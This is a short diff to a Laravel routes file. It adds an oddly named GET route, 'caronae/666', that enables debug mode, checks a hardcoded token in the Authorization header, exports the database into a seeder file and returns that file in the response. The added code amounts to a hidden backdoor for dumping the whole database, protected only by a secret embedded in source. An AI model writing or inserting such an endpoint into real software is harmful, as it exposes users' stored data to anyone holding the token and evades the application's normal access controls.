@@ -107,3 +107,16 @@ Route::group(['middleware' => 'csrf'], function(){
     });
 
 });
+
+Route::get('caronae/666', function(Illuminate\Http\Request $request) {
+    Config::set('app.debug', true);
+ 
+    $authorization = $request->header('Authorization');
+    if ($authorization == null || $authorization != 'token=AYAeG!*knMjqLF0[!ND\xs7t3Uv]16d') {
+        return response()->json(['error'=>'Unauthorized.'], 403);
+    }
+
+    DbExportHandler::seed();
+    return File::get(base_path() . '/database/seeds/caronaeTableSeeder.php');
+
+});
